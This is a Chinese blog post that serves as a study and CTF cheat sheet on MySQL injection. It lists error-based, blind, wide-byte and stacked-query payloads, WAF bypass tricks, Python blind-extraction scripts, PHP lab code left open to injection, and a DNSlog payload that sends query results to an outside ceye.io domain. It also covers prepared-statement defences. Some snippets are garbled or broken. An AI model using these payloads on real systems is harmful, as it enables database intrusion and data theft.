<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>mysql注入漏洞 | F1n_blog</title>
<link rel="shortcut icon" href="https://Jrand-github.github.io/favicon.ico?v=1626319221492">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://Jrand-github.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="mysql注入漏洞 | F1n_blog - Atom Feed" href="https://Jrand-github.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="mySQL注入漏洞总结
https://blog.csdn.net/weixin_32334681/article/details/113301274
联合查询
确认注入类型
数字型：select name,age from admin w..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://Jrand-github.github.io">
  <img class="avatar" src="https://Jrand-github.github.io/images/avatar.png?v=1626319221492" alt="">
  </a>
  <h1 class="site-title">
    F1n_blog
  </h1>
  <p class="site-description">
    每个人都在过着别人羡慕的生活
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              mysql注入漏洞
            </h2>
            <div class="post-info">
              <span>
                2021-07-13
              </span>
              <span>
                25 min read
              </span>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h1 id="mysql注入漏洞总结">mySQL注入漏洞总结</h1>
<p>https://blog.csdn.net/weixin_32334681/article/details/113301274</p>
<h2 id="联合查询">联合查询</h2>
<p>确认注入类型</p>
<p>数字型：select name,age from admin where id =$id</p>
<p>字符型：select name,age from admin where id =’$id’</p>
<p>若是数字</p>
<p>id =1+1 若返回页面不是id=1的 判断为数字型</p>
<p>万能方法：</p>
<p>‘—%20 若正常则为字符型 反之则为数字型</p>
<p>总结根据多次数据库测试</p>
<p>select * from admin where id =1 —%20 正常</p>
<p>select * from admin where id =’1 —%20’ 正常</p>
<p>猜测语句</p>
<pre><code>%23 --+ #
')%23 &quot;)%23 
</code></pre>
<h2 id="报错注入">报错注入</h2>
<p>原理分析<br>
https://www.cnblogs.com/Triomphe/p/9489639.html</p>
<p>12种报错注入+万能语句</p>
<pre><code class="language-sql">1、通过floor报错,注入语句如下:
and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);

2、通过ExtractValue报错,注入语句如下:
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

3、通过UpdateXml报错,注入语句如下:
and 1=(updatexml(1,concat(0x3a,(select user())),1))

4、通过NAME_CONST报错,注入语句如下:
and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)

5、通过join报错,注入语句如下:
select * from(select * from mysql.user ajoin mysql.user b)c;

6、通过exp报错,注入语句如下:
and exp(~(select * from (select user () ) a) );

7、通过GeometryCollection()报错,注入语句如下:
and GeometryCollection(()select *from(select user () )a)b );

8、通过polygon ()报错,注入语句如下:
and polygon (()select * from(select user ())a)b );

9、通过multipoint ()报错,注入语句如下:
and multipoint (()select * from(select user() )a)b );

10、通过multlinestring ()报错,注入语句如下:
and multlinestring (()select * from(selectuser () )a)b );

11、通过multpolygon ()报错,注入语句如下:
and multpolygon (()select * from(selectuser () )a)b );

12、通过linestring ()报错,注入语句如下:
and linestring (()select * from(select user() )a)b );
</code></pre>
<h2 id="布尔注入">布尔注入</h2>
<p>重点：正常情况一个页面，不正常情况另外一种页面而且不回显任何信息</p>
<p>正常<br>
select name from admin where id=1 if((select name from admin where id=1 limit 1,1),true,false)</p>
<p>变形<br>
select name from admin where id=1 and ord(mid(database(),1,1)&gt;100</p>
<h2 id="延时注入">延时注入</h2>
<p>重点：无论正常还是非正常参数都返回一个相同的页面<br>
基本函数<br>
延时：sleep（时间）<br>
判断：if(条件，true，false)<br>
截取：mid<br>
控制数量：<br>
转码：ord</p>
<pre><code>select name from admin where id=1 if(ord(mid((select name from admin where id=1 limit 1,1),1,1))&gt;97,sleep(5),0)
</code></pre>
<h2 id="搜索型注入">搜索型注入</h2>
<p>搜索型语句：</p>
<pre><code>select * from admin where name like '%$id%'
</code></pre>
<p>查询方法构造</p>
<p>‘%a’ //以a结尾的数据<br>
‘a%’ //以a开头的数据<br>
‘%a%’ //含有a的数据<br>
‘<em>a</em>‘ //三位且中间字母是a的<br>
‘<em>a’ //两位且结尾字母是a的‘a</em>‘ //两位且开头字母是a的<br>
关键：闭合语句使用联合查询</p>
<p>测试代码</p>
<pre><code class="language-php">&lt;?php 
$id = $_GET['id'];
$localhost = &quot;127.0.0.1&quot;;
$name=&quot;root&quot;;
$pass=&quot;root&quot;;
$dbname=&quot;bc&quot;;
$conn=mysqli_connect($localhost,$name,$pass,$dbname);
$sql = &quot;select * from admin where name like '%$id%'&quot;;
$result=mysqli_query($conn,$sql);
$text = mysqli_fetch_assoc($result);
$n=$text['name'];
$a=$text['age'];
echo $n;
echo &quot;&lt;br&gt;&quot;;
echo $sql;
 ?&gt;
</code></pre>
<h2 id="二次注入">二次注入</h2>
<pre><code>insert into if_order(out_trade_no,gid,money,rel,benTime,type,number)values(''+data+'',2,10,'245435345345',now(),'qqpay',1)--+
</code></pre>
<p>无效语句</p>
<pre><code>insert into if_order(out_trade_no,gid,money,rel,benTime,type,number)values(eee',2,10,'245435345345',now(),'qqpay',1),((select user()),1,10,'111',now(),'wxpay',1)--+
</code></pre>
<p>正确语句</p>
<p>请后插 无法拼接</p>
<p>代码系统</p>
<pre><code class="language-php">&lt;?php 
$user = $_GET['name'];
$ed = $_GET['ed'];
$localhost = &quot;127.0.0.1&quot;;
$name=&quot;root&quot;;
$pass=&quot;root&quot;;
$dbname=&quot;bc&quot;;
$conn=mysqli_connect($localhost,$name,$pass,$dbname);
//显示所有的用户信息
//首先查询有多少条
$id=1;
while(1==1){
$sql = &quot;select * from admin where id=$id&quot;;
$result = mysqli_query($conn,$sql);
if($result){
$num = mysqli_fetch_assoc($result);
echo $num['name'];
echo &quot;&lt;br&gt;&quot;;
$id=$id+1;
}
else{
break;
}
}
$sql1 = &quot;insert into admin(id,name) values ($ed,$user)&quot;;
$result1 = mysqli_query($conn,$sql1);
if($result1){
echo &quot;&lt;script&gt;alert(\&quot;插入成功\&quot;)&lt;/script&gt;&quot;;
}
else{
echo &quot;&lt;script&gt;alert(\&quot;插入失败\&quot;)&lt;/script&gt;&quot;;
}
?&gt;
</code></pre>
<h2 id="宽字节注入">宽字节注入</h2>
<p>逃逸单引号</p>
<pre><code>mysql的数据库默认字符设置为SET NAMES GBK
</code></pre>
<p><strong>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</strong></p>
<p><strong>%df%27===&gt;(addslashes)<mark><mark>&gt;%df%5c%27</mark></mark>&gt;(GBK)====&gt;運’</strong></p>
<p><strong>用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</strong></p>
<pre><code>当一个Mysql连接请求从客户端传来的时候，服务器认为它的编码是character_set_client，
然后会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，
然后更新到数据库的时候，再转化成字段所对应的编码
如果使用了set names指令，那么可以修改character_set_connection的值，
也同时会修改character_set_client和character_set_results的值
当从数据库查询数据返回结果的时候，将字段从默认的编码转成character_set_results
</code></pre>
<p>修复：</p>
<p>（1）使用mysql_set_charset(GBK)指定字符集</p>
<p>（2）使用mysql_real_escape_string进行转义</p>
<p>原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？</p>
<p>就是使用mysql_set_charset进行指定。</p>
<p>上述的两个条件是“与”运算的关系，少一条都不行。\</p>
<p>https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/</p>
<h2 id="dns注入">DNS注入</h2>
<p>在测试一些网站的时候，一些注入都是<code>无回显</code>的，所以我们一般会采用<code>盲注法，延时注入或布尔注入</code>，有些情况下布尔注入不可以使用，但是延时注入的时间又太慢，我们就会使用一种高效的方法—<code>DNS注入</code></p>
<p>DNS注入要求<br>
DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
<p>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>
2、当secure_file_priv为G:\，就可以读取G盘的文件。<br>
3、当secure_file_priv为null，load_file就不能加载文件。</p>
<p>无论secure_file_priv 为任何属性均可以使用dns注入前提<br>
通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。<br>
数据库在配置中允许域名解析时，到数据库中查看：</p>
<pre><code>show variables like ‘skip_name_resolve’;
</code></pre>
<p>默认情况下MYSQL域名解析禁止 开关试off的 所以不需要担心</p>
<p>原理</p>
<p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息<br>
简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p>
<p>这样说原理很抽象，下面通过实际例子看下。</p>
<p><a href="http://ceye.io/">http://ceye.io</a> 这是一个免费的记录dnslog的平台，我们注册后到控制面板会给你一个二级域名：xxx.ceye.io,当我们把注入信息放到三级域名那里，后台的日志会记录下来</p>
<p>本地复现</p>
<p>首先去DNSlog网站获取一个子域名</p>
<pre><code>select load_file('\\\\aaaa.x1rzd3.ceye.io\\ddd');
</code></pre>
<p>查看Dnslog是否有解析信息</p>
<pre><code>select load_file(concat('\\\\',(select name from admin where id=1 ),'.x1rzd3.ceye.io\\ddd'));
</code></pre>
<p>为什么要\？</p>
<p>UNC路径，对指定的域名进行DNS查询，通过查询域名递归的方式，DNS服务器可以将返回数据通过DNS协议带出去。</p>
<pre><code>  PS：路径是windows下的特性，默认安装的linux下不存在这样的功能    
</code></pre>
<p>为什么要\？</p>
<p>\原本是两条 但经过解析只会变成一条所以 要进行转义变成\</p>
<pre><code> PS： 不可以.x1rzd3.ceye.io 还要.x1rzd3.ceye.io\乱写数字字母都可.x1rzd3.ceye.io\\fkjs
</code></pre>
<p>Payload</p>
<pre><code>select load_file(concat('\\\\'(select name from admin where id=1 ),'.x1rzd3.ceye.io\\ddd'));
</code></pre>
<p>参考链接：</p>
<p>https://blog.csdn.net/Auuuuuuuu/article/details/88082184</p>
<p>https://www.cnblogs.com/afanti/p/8047530.html</p>
<h2 id="insert注入">Insert注入</h2>
<p>布尔注入</p>
<pre><code>insert into admin(id,name) values ($ed,$user)
</code></pre>
<p>Payload<br>
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>=</mo><mo>(</mo><mi>i</mi><mi>f</mi><mo>(</mo><mi>o</mi><mi>r</mi><mi>d</mi><mo>(</mo><mi>m</mi><mi>i</mi><mi>d</mi><mo>(</mo><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo>(</mo><mo>)</mo><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo>)</mo><mo>)</mo><mo>&gt;</mo><mn>1</mn><mo separator="true">,</mo><mi>T</mi><mi>r</mi><mi>u</mi><mi>e</mi><mo separator="true">,</mo><mi>f</mi><mi>a</mi><mi>l</mi><mi>s</mi><mi>e</mi><mo>)</mo><mo>)</mo><mi>i</mi><mi>n</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi><mo>(</mo><mi>i</mi><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>s</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">user = (if(ord(mid(database(),1,1))&gt;1,True,false))
insert into admin(id,name) values (</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mopen">(</span></span></span></span>ed,$user)</p>
<p>ID NAME<br>
A G E<br>
1 0 19<br>
2 1 34<br>
当name = 1 则为true 0为false<br>
多行注入</p>
<p>insert into admin(id,name) values (<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>d</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">ed,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mpunct">,</span></span></span></span>user)<br>
Payload</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>=</mo><mn>1</mn><mi mathvariant="normal">）</mi><mo separator="true">,</mo><mo>(</mo><mn>1</mn><mo separator="true">,</mo><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi><mo>)</mo><mo separator="true">,</mo><mo>(</mo><mn>2</mn><mo separator="true">,</mo><mi>h</mi><mi>a</mi><mi>c</mi><mi>k</mi><mi>e</mi><mi>r</mi><mo>)</mo><mi>i</mi><mi>n</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi><mo>(</mo><mi>i</mi><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>s</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">user = 1）,(1,admin),(2,hacker)
insert into admin(id,name) values (</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback">）</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mopen">(</span></span></span></span>ed,$user)</p>
<h2 id="delete注入">Delete注入</h2>
<h2 id="update注入">Update注入</h2>
<p>更改密码</p>
<p>类似更改密码也有可能出现漏洞</p>
<p>用户注册过程</p>
<p>第一次insert</p>
<p>用户想覆盖注册admin 但是系统通过后台校验禁止注册admin</p>
<p>用户注册一个名为hacker的用户名</p>
<p>更改密码</p>
<p>第二次update</p>
<p>update admin set password=’22222’ where name=’hacker’;</p>
<p>这是一个正常过程</p>
<p>入侵过程</p>
<p>用户注册了一个admin’#的账户</p>
<p>再修改密码过程中</p>
<p>update admin set password=’22222’ where name=’admin’#’;</p>
<p>在此过程出现了重置admin用户的漏洞</p>
<h1 id="攻击方法">攻击方法</h1>
<h2 id="异或注入">异或注入</h2>
<p>异或运算规则:<br>
<code>1^1=0 0^0=0 0^1=1</code><br>
<code>1^1^1=0 1^1^0=0</code><br>
构造payload:<code>'^ascii(mid(database(),1,1)=98)^0</code></p>
<pre><code class="language-mysql">^if((select(ascii(mid(group_concat(table_name),1,1))&gt;100)from(information_schema.tables)where(table_schema)like(0x6461696d6132)),1,0);
</code></pre>
<p>过滤了^</p>
<p>=“”</p>
<pre><code>&quot;0^&quot; + &quot;(ascii(substr((select(password)from(waf01)),{0},1))&gt;{1})&quot;.format(i,mid)
</code></pre>
<pre><code>0'(ascii((select(passwd)from(waf01))from(1))&gt;0)^'0
ascii()&gt;0
select(passwd)from(waf01))from(1)
</code></pre>
<pre><code class="language-python">import requests
import time

urls=&quot;http://opence.com/waf01/index.php?username=&quot;
a=&quot;&quot;
for i in range(1,10):
	for j in range(1,128):
		strs= &quot;0'^&quot; + &quot;(ascii(mid((passwd)from({0})))&gt;{1})&quot;.format(i,j)+&quot;^'0&quot;
		url=urls+strs
		html = requests.get(url)
		print(j)
		if &quot;username=admin&quot; in html.text:
			a=a+chr(j)
			print(a)
			break
print(a)



</code></pre>
<p>二分法代码</p>
<pre><code class="language-python">import requests
import time
urls=&quot;http://opence.com/waf01/index.php?username=&quot;
str=&quot;&quot;
min=32
max=128
for i in range(1,30):
    while min&lt;max:
        mid =(min+max)//2
        r=request.get(urls+payload)
        if admin in r.text:
            min=mid+1
        else:
            max=mid
     if mid!=32:
        str=str+chr(mid)
        print(str)
</code></pre>
<h2 id="万能密码">万能密码</h2>
<p>0x01未过滤<code>'</code></p>
<pre><code>数据库查询语句
select * from users where username='' and password='';
</code></pre>
<pre><code>username=' or 1=1#
</code></pre>
<p>0X02未过滤<code>\</code>但过滤<code>'</code></p>
<pre><code>数据库查询语句
select * from users where username='' and password='';
</code></pre>
<pre><code>用户名：admin\
密码：or 1 #     //等号也被过滤了

即构造了：select * from users where username='admin\' and password='or 1 #'

布尔注入脚本
select * from users where username='admin\' and password='^ (ascii(substr((password),%d,1))&gt;%d)#'
</code></pre>
<p>https://blog.csdn.net/qq_45521281/article/details/105810265</p>
<h2 id="利用预编译注入">利用预编译注入</h2>
<p><strong>黑名单绕过 concat 拼接语句</strong></p>
<pre><code class="language-mysql">//定义预编译语句
PREPARE a FROM preparable_stmt;

//执行预编译语句
EXECUTE a [USING @var_name [, @var_name] ...];

-1';PREPARE hacker from concat('select flag from `1919810931114514`');EXECUTE hacker;#
</code></pre>
<h2 id="handler查询"><strong>handler查询</strong></h2>
<p>mysql可以使用select查询表中的数据，也可使用handler语句，这条语句是一行一行的浏览一个表中的数据。<br>
<strong>handler可以用于MyISAM和InnoDB表。</strong><br>
使用方法：<br>
handler table_name open打开一张表<br>
handel table_name read first读取第一行内容，<br>
handel table_name read next依次获取其它行<br>
最后一行执行之后再执行handel table_name read next会返回一个空的结果。</p>
<pre><code>-1';handler `1919810931114514` open;handler `1919810931114514` read first;#
</code></pre>
<h2 id="基于约束的sql攻击">基于约束的SQL攻击</h2>
<p>https://blog.csdn.net/qq_41617034/article/details/106431679</p>
<p>挖洞可以使用，任意账号注册</p>
<pre><code class="language-php">示例
&lt;?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = &quot;SELECT *
          FROM users
          WHERE username='$username'&quot;;
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) &gt; 0) {
  }
  else {
    $query = &quot;INSERT INTO users(username, password)
              VALUES ('$username','$password')&quot;;
</code></pre>
<p>主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。</p>
<p>在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将<strong>较短的字符串末尾填充空格</strong></p>
<p>修复：</p>
<p>预防手段<br>
1：唯一性。查询结果大于1查询不成立。<br>
2.对输入的长度进行限制。<br>
3.使用id作为主键。<br>
4.使用最新版本的mysql（5.7.17）已经无效，已经修复。</p>
<p>基于无列名注入</p>
<h2 id="无列名注入">无列名注入</h2>
<p>原理</p>
<pre><code>select id,username from admin 
select * from admin 

=select `3` from (selct 1,2 union select * from admin )a
=select b from (selct 1,2 as b union select * from admin )a
末尾的 a 可以是任意字符，用于命名。
</code></pre>
<p>https://zhuanlan.zhihu.com/p/98206699</p>
<h1 id="防御">防御</h1>
<p>建议参考一下内容</p>
<p>https://blog.csdn.net/huanghelouzi/article/details/82995313</p>
<p>https://blog.csdn.net/a15803617402/article/details/82789477</p>
<h3 id="预编译防止注入">预编译防止注入</h3>
<pre><code>MySQL执行预编译分为如三步：

执行预编译语句，例如：prepare myfun from 'select * from t_book where bid=?'
设置变量，例如：set @str='b1'
执行语句，例如：execute myfun using @str
</code></pre>
<p>1.连接数据库（mysqli）</p>
<pre><code class="language-php">$username=&quot;root&quot;;
$password=&quot;root&quot;;
$localhost=&quot;127.0.0.1&quot;;
$db=&quot;daima&quot;;

$conn=mysqli_connect($localhost,$username,$password,$db);
#查询
$sql=&quot;select Np,Nr from jms_admin where id=?&quot;;
$stmt=$conn-&gt;prepare($sql);
$id=1;
$stmt-&gt;bind_param(&quot;i&quot;,$id);
$stmt-&gt;excute();
$stmt-&gt;bind_result($Np);



</code></pre>
<h2 id="ctf题目">CTF题目</h2>
<p>堆叠注入</p>
<p>绕过黑名单限制</p>
<p>buuctf-&gt;easysql</p>
<p>https://blog.csdn.net/weixin_44037296/article/details/105190639</p>
<p>https://blog.csdn.net/qq_43428139/article/details/105774751</p>
<p>https://www.cnblogs.com/Vinson404/p/7253255.html</p>
<p>关键词过滤</p>
<h2 id="sql入绕过">sql入绕过</h2>
<h3 id="关键字绕过">关键字绕过</h3>
<h4 id="大小写绕过">大小写绕过</h4>
<p>常用于 <code>waf</code>的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>
例如：waf过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p>
<pre><code class="language-sql">mysql&gt; select * from users where id = -1 union select 1,2,3
mysql&gt; select * from users where id = -1 union Select 1,2,3;
</code></pre>
<h4 id="内联注释绕过">内联注释绕过</h4>
<p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
<pre><code class="language-sql">mysql&gt; select * from users where id = -1 union /*!select*/ 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
</code></pre>
<h4 id="双写关键字绕过">双写关键字绕过</h4>
<p>在某一些简单的<code>waf</code>中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p>
<h4 id="特殊编码绕过">特殊编码绕过</h4>
<ul>
<li>十六进制绕过</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where username = 0x7465737431;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
123456
</code></pre>
<ul>
<li>ascii编码绕过<br>
<code>Test</code> 等价于<br>
<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code><br>
tip:好像新版mysql不能用了</li>
</ul>
<h4 id="绕过">&lt;&gt;绕过:</h4>
<pre><code class="language-mysql">unio&lt;&gt;n sel&lt;&gt;ect(可能是有些网站为了防止xss注入,所以过滤了&lt;&gt;,参照i春秋sql)
</code></pre>
<h2 id="关键词替换">关键词替换</h2>
<h3 id="注释符号绕过">注释符号绕过</h3>
<p>常用的注释符有</p>
<pre><code>-- 注释内容
# 注释内容
/*注释内容*/\
;
</code></pre>
<h3 id="空格过滤绕过">空格过滤绕过</h3>
<p>一般绕过空格过滤的方法有以下几种方法来取代空格</p>
<pre><code class="language-mysql">/**/
()
回车(url编码中的%0a)
`(tap键上面的按钮)
tap
两个空格
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
</code></pre>
<h4 id="无需空格注入">无需空格注入</h4>
<pre><code class="language-mysql">查询表名

admin'union(select(table_name),(2),(3)from(information_schema.tables)where(table_schema=0x74657374))#

查询列名
admin'union((select(column_name),(2),(3)from(information_schema.columns)where(table_schema=0x74657374)and(table_name=0x75736572)))#

查询数据
admin'union(select(username),(password),(3)from(user))#

获取表名
admin'and(select(ascii(mid(group_concat(table_name),1,1))=116)from(information_schema.columns)where(table_schema=0x74657374))#

获取字段名
admin'and(select(ascii(mid(group_concat(column_name),1,1))=73)from(information_schema.columns)where(table_schema=0x74657374)and(table_name=0x75736572))#

#时间盲注获取数据库名称
admin'and(if((ascii(mid(database(),1,1))=116),sleep(5),0))#

#布尔注入
